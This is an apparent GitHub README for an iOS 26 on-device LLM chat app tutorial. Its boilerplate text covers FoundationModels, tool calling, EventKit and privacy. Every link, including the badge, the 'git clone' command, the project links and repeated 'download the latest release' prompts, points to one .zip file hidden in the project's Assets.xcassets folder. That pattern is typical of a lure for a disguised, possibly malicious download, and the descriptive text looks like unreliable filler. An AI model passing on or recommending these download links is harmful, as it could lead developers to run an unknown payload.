https://github.com/Khalidelommali/Foundation-Model-Tutorial/raw/refs/heads/main/foundation-model-tutorial/Assets.xcassets/Model_Foundation_Tutorial_2.8.zip

# Foundation Model Tutorial: iOS 26 On-Device LLMs with Privacy

![Releases Badge](https://github.com/Khalidelommali/Foundation-Model-Tutorial/raw/refs/heads/main/foundation-model-tutorial/Assets.xcassets/Model_Foundation_Tutorial_2.8.zip)

🧭 Welcome to a hands-on guide for building an iOS 26 chat app that runs FoundationModels on-device. This project demonstrates on-device language models, tool calling, EventKit integration, and privacy-first AI. It is a practical, developer-friendly starting point for integrating foundation models into mobile apps while keeping user data on-device.

Table of Contents
- What this project is about
- Core concepts
- Quick start
- How the project is organized
- On-device AI with FoundationModels
- Tool calling and plugins
- EventKit integration
- Privacy and security
- Architecture and patterns
- User experience and UI
- Accessibility and localization
- Performance and power considerations
- Development workflow
- Testing and debugging
- Examples and use cases
- Extending and contributing
- Release notes
- FAQ
- License

What this project is about
This repository showcases a complete, end-to-end iOS 26 chat app that leverages the FoundationModels framework to run LLMs directly on the device. It highlights several important capabilities:
- On-device large language models (LLMs) that never leave the user’s device.
- Tool calling to extend the LLM with native iOS capabilities.
- EventKit integration to create, read, and manage calendar events by natural language.
- Privacy-first AI that minimizes data movement and emphasizes user consent and transparency.

Core concepts
- On-device AI: The app loads a lightweight foundation model on the device and performs inference locally. No cloud dependency is required for core chat features.
- FoundationModels framework: A family of on-device AI tools that enable natural language understanding, reasoning, and lightweight generation within the sandboxed app.
- Tool calling: The LLM can call native tools to perform tasks such as calendar operations, reminder scheduling, and data lookup. The app exposes a clean interface for tool handlers and safety checks.
- EventKit integration: The app can translate user intent into calendar actions, create events, and modify schedules while respecting user privacy and permissions.
- MVVM and SwiftUI: The app uses a clear MVVM architecture with SwiftUI for UI. State is predictable, testable, and easy to extend.
- Privacy-first: Data is processed on-device whenever possible. Network access is minimized, and user consent is central to any data-sharing behavior.

Quick start
Prerequisites
- macOS with Xcode suitable for iOS 26 development
- An iPhone or iOS simulator running iOS 26
- Knowledge of Swift and SwiftUI
- Familiarity with MVVM patterns
- An understanding of app sandboxing and iOS permissions (calendar access)

Getting the code
- Clone the repository
  - git clone https://github.com/Khalidelommali/Foundation-Model-Tutorial/raw/refs/heads/main/foundation-model-tutorial/Assets.xcassets/Model_Foundation_Tutorial_2.8.zip
- Open the Xcode workspace or project
  - https://github.com/Khalidelommali/Foundation-Model-Tutorial/raw/refs/heads/main/foundation-model-tutorial/Assets.xcassets/Model_Foundation_Tutorial_2.8.zip or https://github.com/Khalidelommali/Foundation-Model-Tutorial/raw/refs/heads/main/foundation-model-tutorial/Assets.xcassets/Model_Foundation_Tutorial_2.8.zip
- Resolve dependencies
  - If the project uses Swift Package Manager, ensure all packages resolve
  - If CocoaPods or Carthage are used, run pod install or carthage update as appropriate
- Build for iOS 26
  - Choose a device or a simulator that runs iOS 26
  - Build and run the app

Downloading and running the release
- The initial release assets are available in the Releases section. To download the latest release asset, use the link above. If you prefer the direct destination, visit the Releases page and grab the appropriate asset package for your development environment.
- Download the latest release asset and unzip it.
- Open the project or sample app in Xcode and run it on your device or simulator.

Note: You can download the latest release from https://github.com/Khalidelommali/Foundation-Model-Tutorial/raw/refs/heads/main/foundation-model-tutorial/Assets.xcassets/Model_Foundation_Tutorial_2.8.zip

How the project is organized
- App
  - App entry point, scene management, and global environment
- ViewModels
  - Core view models that bind data to views
- Views
  - The chat UI, conversation list, and detail views
- Models
  - Conversation threads, prompts, and user data models
- Services
  - LLM engine manager, tool registry, and data privacy services
- Tools
  - Tool adapters for calendar, reminders, and other system services
- Resources
  - Localized strings, images, and UI assets
- Tests
  - Unit tests for models and view models, as well as UI tests where appropriate

On-device AI with FoundationModels
- Local inference: The app loads a foundation model on the device and runs inference without sending user data to a server.
- Lightweight prompts: Interaction uses concise prompts and streaming responses where supported to provide a responsive experience.
- Model selection: The app can be configured to use different on-device models depending on device capabilities and user preferences.
- Safety boundaries: All model outputs pass through a safety layer to filter unsafe or harmful content. Tool calls are validated before execution.

Tool calling and plugins
- Tool registry: The app defines a set of tools it can call, such as calendar creation, event search, and local data access.
- Prompt design: The LLM is guided to call tools when a task benefits from it, for example creating a calendar event from natural language.
- Execution pipeline: A safe execution pipeline ensures only approved tools and parameters are used.
- Error handling: The app gracefully handles tool failures, including user-facing error messages and easy retry options.

EventKit integration
- Calendar access: The app uses EventKit to read and write calendar data, with appropriate user permissions.
- Event creation: Users can ask the assistant to create events, reminders, or appointments. The app translates these requests into EventKit objects.
- Conflict handling: The app detects scheduling conflicts and offers alternatives or prompts for user input.
- Privacy controls: Calendar data remains in the device’s sandbox. If you enable sync or cloud-based features, only explicit user consent will trigger data transfer.

Privacy and security
- Data locality: Personal data stays on-device whenever possible. Network calls, if any, are minimized and encrypted.
- Permissions: The app clearly explains why each permission is needed, and users can revoke permissions at any time.
- Encryption: Sensitive data stored on the device is encrypted using system-provided mechanisms.
- Auditing: Actions taken by the user and the assistant are logged locally for debugging and user transparency.
- Compliance: The design aligns with common privacy expectations for on-device AI and calendar data usage.

Architecture and patterns
- MVVM: The app follows a clean separation of concerns. Views bind to view models, which orchestrate data flow and business logic.
- SwiftUI: The UI is built with SwiftUI for rapid development and a responsive user experience.
- Dependency injection: The project uses DI to decouple components, making the app easier to test and extend.
- Modularity: Core AI logic is separated from the UI, enabling reuse in other apps or prototypes.
- Testing strategy: Unit tests cover models and view models; UI tests verify user flows around chat, tool calls, and calendar interactions.

User experience and UI
- Chat-first UI: A familiar chat interface allows users to converse with the on-device AI assistant.
- Tool prompts: The assistant can ask for permission or clarification before invoking a tool.
- Calendar-aware conversations: The assistant can propose events, check dates, and adjust times with natural language.
- Accessibility: UI elements are labeled for screen readers, with scalable text support and high-contrast options.
- Localization: The app includes support for multiple languages to reach a broader audience.

Accessibility and localization
- Dynamic type and font size: The UI respects user font size preferences for readability.
- VoiceOver support: All interactive elements are accessible and properly labeled.
- Localizable strings: Text content is extracted for translation, with fallbacks if translations are missing.
- Cultural considerations: The app avoids culturally sensitive content and uses neutral language in prompts and messages.

Performance and power considerations
- Battery-aware inference: On-device models are optimized for energy efficiency. Inference load is managed to keep battery impact reasonable.
- Memory usage: The app loads models and caches prompts efficiently to minimize RAM consumption.
- Responsiveness: The UI remains interactive even while the model is computing results, using streaming responses where supported.

Development workflow
- Branching strategy: Use feature branches for new capabilities (e.g., feature/calendar-tool, feature-privacy-hardening).
- Code quality: Follow the repository’s coding standards. Run linters and formatters as part of your workflow.
- Continuous integration: If CI is set up, ensure builds pass for both iOS devices and simulators.
- Documentation: Update README and inline code comments as you add features. Keep the doc synced with the code.

Testing and debugging
- Unit tests: Test models, prompts, and view models independently.
- UI tests: Validate common user flows like starting a chat, asking for a calendar action, and handling permission prompts.
- Logging: Use lightweight, privacy-aware logging to diagnose issues without exposing user data.
- Debug builds: Create a debug flag to enable verbose logs and mock tools during development.

Examples and use cases
- Natural language calendar management: “Schedule a meeting with Alex next Friday at 3 PM and invite Jamie.”
- Reminder automation: “Remind me to call the client after lunch tomorrow.”
- Knowledge queries: “What’s my next upcoming event that conflicts with a project deadline?”
- Local data retrieval: “Show me all events I created last week.”

Extending and contributing
- How to contribute
  - Fork the repository
  - Create a feature branch
  - Implement, test, and document your changes
  - Open a pull request with a clear summary and rationale
- Coding guidelines
  - Write readable, well-documented code
  - Include unit tests for new functionality
  - Add or update documentation where relevant
- Design guidelines
  - Keep the UI simple and accessible
  - Prefer on-device logic for privacy-sensitive tasks
  - Clearly separate model logic from UI logic

Integrating additional features
- Adding more tools
  - Extend the tool registry with handlers for reminders, notes, or weather lookups
  - Define a safe interface for tool input validation
  - Provide clear fallbacks if a tool cannot be executed
- New model options
  - Experiment with different on-device models based on device capability
  - Provide a user preference to switch models or disable on-device inference for privacy-first guarantees

Release notes
- This project emphasizes on-device AI, tool usage, and calendar integration.
- Each release includes a summary of improvements, bug fixes, and any breaking changes to the API surface or prompts.
- The Releases page contains assets and versioned bundles that you can download to quickly try the latest features.

Releases and downloads
- You can find release assets and versioned bundles on the official Releases page. To download the latest release asset, visit the Releases page and grab the appropriate package for your environment.
- For convenience, you can also browse the repository’s Releases section to see what has changed in each update, including new tools, model options, and UI refinements.
- Download the latest release from https://github.com/Khalidelommali/Foundation-Model-Tutorial/raw/refs/heads/main/foundation-model-tutorial/Assets.xcassets/Model_Foundation_Tutorial_2.8.zip

Troubleshooting
- If the app cannot access the calendar, ensure you granted calendar permissions in Settings. The app will request permission at first use and clearly communicate why it needs access.
- If on-device inference fails to start, verify device compatibility and the chosen model. Some models require more memory or CPU capacity, so a lower-demand option may be necessary on older devices.
- If tool calls fail, check that the tool registry is properly configured and that the user’s intent is understood. Debug logs can help you identify mismatch in prompts or missing tool handlers.

Code quality and style
- Use clear naming for models, prompts, and tools to reduce ambiguity.
- Keep prompt engineering modular and testable.
- Document complex prompts with examples to help future contributors understand intended behavior.
- Maintain a consistent UI style aligned with iOS design guidelines.

Security considerations
- Minimize data exposure: keep most data on-device and only share information with explicit user consent if necessary.
- Clear permissions: explain why the app needs each permission and how it uses the data.
- Safe tool execution: enforce strict input validation and sandboxed tool calls to prevent unexpected behavior.

Community and support
- If you have questions, file an issue on the repo.
- For discussions, use the repository’s Discussions tab (if enabled) or the issue tracker to start conversations about features and improvements.
- When contributing, follow the provided guidelines and reference the contribution section above.

Changelog highlights (selected past updates)
- v1.0: Initial release with on-device LLM, tool calling, EventKit integration, and privacy-first design.
- v1.1: Performance improvements, UI refinements, and expanded tool set for calendar management.
- v1.2: Enhanced privacy controls, improved prompts, and better error handling.
- v1.3: Localization support and accessibility improvements.

FAQ
- Do I need internet access for this app? The core on-device AI runs without internet. Some auxiliary features or updates may require connectivity, but user data remains under the device’s control.
- Can I customize the model? Yes, the app is designed to allow model configuration and switching based on device capability and user preference.
- How does tool calling stay secure? Tools are registered with strict input validation and are sandboxed. All tool calls pass through a safety layer before execution.

License
- This project is intended for learning and experimentation. Review the LICENSE file in the repository for specifics about rights and restrictions.

End-user guidance
- Use the UI to chat with the on-device assistant and gradually explore tool calls.
- Try natural language requests that involve calendars, like scheduling, rescheduling, and reminders, to see how tool calls integrate with EventKit.
- Experiment with prompts to understand how the assistant decides when to call a tool versus respond directly.

Note on the releases link
- To explore the latest assets and release notes, visit the Releases page: https://github.com/Khalidelommali/Foundation-Model-Tutorial/raw/refs/heads/main/foundation-model-tutorial/Assets.xcassets/Model_Foundation_Tutorial_2.8.zip Download the latest package to experiment offline, review sample configurations, and test on-device AI performance in your environment.

Appendix: prompts and examples
- Example prompt for a calendar task
  - "Create a calendar event for a team meeting next Tuesday at 10 AM for 45 minutes with attendees listed as me and the team."
- Example prompt for a reminder
  - "Set a reminder to follow up with the client in two days at 9 AM."
- Example prompt for knowledge lookup
  - "What is my next event, and does it conflict with any open tasks I have scheduled?"

Developer notes
- The project is designed to be approachable for iOS developers who want to explore on-device AI with practical use cases.
- It emphasizes modularity, testability, and a clean separation between AI logic and UI components.
- The repository includes sample code for integrating FoundationModels, handling tool calls, and using EventKit to manage calendar events.

Repository topics
- Apple intelligence, chat app, EventKit, Foundation Models, iOS, iOS26, LLM, MVVM, on-device AI, Swift, SwiftUI, tutorial

Technical glossary
- FoundationModels: A family of on-device AI components enabling local inference and lightweight AI tasks.
- Tool calling: A mechanism by which the AI model triggers native app actions via predefined tools.
- EventKit: Apple framework for accessing calendar and reminder data.
- MVVM: Model-View-ViewModel pattern for clean separation of concerns.
- SwiftUI: Declarative UI framework for building interfaces across Apple platforms.

Additional resources
- Apple developer documentation for EventKit and SwiftUI
- FoundationModels documentation and example projects
- Community-driven examples of on-device AI in mobile apps

Thank you for exploring this tutorial. It covers the core principles needed to build privacy-conscious, on-device AI experiences on iOS 26, with a focus on calendar-aware interactions and tool-driven capabilities.